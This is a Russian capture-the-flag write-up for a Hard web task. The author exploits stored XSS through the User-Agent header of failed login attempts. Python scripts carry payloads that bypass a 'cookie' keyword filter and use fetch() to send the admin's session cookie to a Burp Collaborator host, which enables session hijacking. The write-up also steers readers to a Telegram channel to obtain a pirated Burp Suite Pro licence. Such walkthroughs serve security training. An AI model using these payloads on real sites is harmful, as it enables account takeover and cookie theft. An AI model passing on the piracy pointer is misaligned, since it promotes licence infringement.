**level**: **Hard**
**Description**: Воображение важнее, чем знания
**IP**: 62.173.140.174:16035

Мы видим - форма логин/регистрации
Попробуем создать аккаунт, нужно будет получить доступ к аккаунту админа.

Изучаем html код.

Видим личный кабинет  с "failed login attempts".
Попробуем XSS payload, зарегистрируем пользователя с логином:
````javascript 
<script>alert(1)</script>
````
Также пробуем зайти вне с неправильным паролем, и видим что XSS-уязвимость есть, это нам поможет захватить аккаунт пользователя запустив на нем javascript code, если сможем послать наш пейлоад.

Но изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent запросто!

Для этого напишем скрипт на python:

import requests

payload = "<script>alert(1);</script>" # пейлоад

user = "asdf" #Тут username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 

У нас получилось внедрить свой код.

Для данного способа вам потребуется ```Burp Suite Pro```.
Потому, что там есть ```Collaborator```, которого нет в бесплатной версии. 
Переходим по ссылке ``` https://t.me/pt_soft``` чтобы "купить" нашу лицензию.
В поиске по каналу в телеге ищем **Burpsuite**. И устанавливаем.


После поиска в гугл по запросу "XSS steal cookie payloads" и изучения результатов понимаем что нам нужно захватить ```document.cookie```.
Пробуем простой alert();

````python 
import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
И сталкиваемся с проблемой
Все отработало, но alert'a нет. А это все потому, что на Codeby.games есть похожий таск, надо применить фильтрацию на серверной части на слово ```cookie```.

Не забываем, что у нас есть неограниченный доступ к javascript на клиентской части.
в функции alert() нам нужно вывести document.cookie.
Попробуем сделать это с помощью переменных.

````javascript
const vv = ["coo", "kie"].join("");
alert(document[vv]); 
````
Пробуем этот payload.
````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
Нам потребовался коллаборатор в бурпе.
Данное значение, которое только вывели в alert, мы будем ловить на его сервер.

Мы только что поймали наш request и можем его детально рассмотреть.
Эта функция заменит нам ngrok или свой белый IP и сервер, очень удобно.
Копируем и вставляем в скрипт.

````python 
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````

Отправляем, ждем.
Подставим значение PHPSESSID в наш браузер.
